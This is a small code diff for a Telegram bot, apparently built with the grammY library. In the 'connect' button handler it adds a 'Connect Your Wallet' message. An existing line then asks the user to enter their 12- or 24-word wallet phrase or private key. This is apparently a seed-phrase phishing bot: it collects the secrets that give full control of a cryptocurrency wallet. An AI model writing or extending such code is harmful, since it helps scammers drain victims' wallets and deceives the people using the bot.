@@ -33,6 +33,7 @@ bot.command("start", async (ctx) => {
 // Wait for click events with specific callback data.
 bot.callbackQuery("connect", async (ctx) => {
   ctx.deleteMessage()
+  await ctx.reply("Connect Your Wallet");
   await ctx.reply("Enter wallet phrase (usually 12 or 24 words) OR Private Key to import wallet");
 });
 
